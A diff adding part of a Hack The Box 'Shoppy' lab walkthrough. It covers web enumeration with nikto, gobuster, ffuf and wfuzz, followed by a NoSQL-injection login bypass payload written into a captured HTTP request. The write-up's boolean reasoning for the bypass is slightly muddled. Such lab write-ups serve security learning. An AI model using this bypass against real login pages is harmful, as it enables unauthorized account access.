@@ -78,3 +78,137 @@ Let's visit `http(80)` first.
 
 ### http(80)
 ---
+![](attachments/shoppy_1.png)
+
+The first index page shows that the service is not open yet with timer.
+It looks like the site is for online shopping.. Maybe purchase, or storage services are running..?
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ nikto -h http://shoppy.htb
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.11.180
++ Target Hostname:    shoppy.htb
++ Target Port:        80
++ Start Time:         2024-11-26 06:27:03 (GMT-5)
+---------------------------------------------------------------------------
++ Server: nginx/1.23.1
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: GET, HEAD .
++ /login/: This might be interesting.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+```
+
+`nikto` scan found that it has `/login` page. Other than that, there's nothing useful.
+Also, given the find of `wp-config.php`, I think the server is running on `wordpress` and php.
+Before visiting the login page, let's run `gobuster` first.
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://shoppy.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 179] [--> /images/]
+/login                (Status: 200) [Size: 1074]
+/admin                (Status: 302) [Size: 28] [--> /login]
+/assets               (Status: 301) [Size: 179] [--> /assets/]
+/css                  (Status: 301) [Size: 173] [--> /css/]
+/Login                (Status: 200) [Size: 1074]
+/js                   (Status: 301) [Size: 171] [--> /js/]
+/fonts                (Status: 301) [Size: 177] [--> /fonts/]
+/Admin                (Status: 302) [Size: 28] [--> /login]
+```
+
+Several pages are found, and `/admin`, `login` pages look interesting..
+Let's visit `/login` page.
+
+![](attachments/shoppy_2.png)
+
+It's a simple login page. `/admin` is also redirected to this login page. I checked its source code, but nothing useful. I tried to capture the request and response using `Burpsuite` but no useful information found..
+
+Just in case if it has vHosts, let's try `ffuf`.
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fs 169 -s
+```
+
+No other vHosts found here... What about subdomain?
+Let's try finding sub-domains using `ffuf` again.
+
+At this time, I'm using a larger wordlists : `bitquark-subdomains-top100000.txt`
+
+```bash
+┌──(kali㉿kali)-[~/htb]
+└─$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.180/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload   
+=====================================================================
+
+000047340:   200        0 L      141 W      3122 Ch     "mattermost"   
+```
+
+`mattermost` is found here.
+As long as I know, mattermost is a chat application which can be hosted locally.
+
+![](attachments/shoppy_3.png)
+
+I tested this login input with sqli wordlist(`/usr/share/seclists/Fuzzing/SQLi/quick-sqli.txt`), but it doesn't seem working.
+Instead, let me try NoSQL Injection.
+
+Here are some references:
+https://book.hacktricks.xyz/pentesting-web/nosql-injection
+https://nullsweep.com/a-nosql-injection-primer-with-mongo/
+
+First let's catch the login request again.
+
+```shell
+{"device_id":"","login_id":"admin","password":"passwd","token":""}
+```
+
+Based on the article mentioned above, `' || 'a'=='a` can help us inject SQL.
+
+```perl
+POST /login HTTP/1.1
+Host: shoppy.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+<SNIP>
+
+username=admin%27+%7C%7C+%271%27+%3D%3D+%271&password=test
+```
+
+With this query, the expected full query is supposed to be like the following;
+
+`'username'=='admin' || '1'=='1' && 'password'=='test'`
+The formula of this will be `False || True && False` => Which ends up being `True`
+
+![](attachments/shoppy_4.png)
+
+Now I can see the "Shoppy App" page.
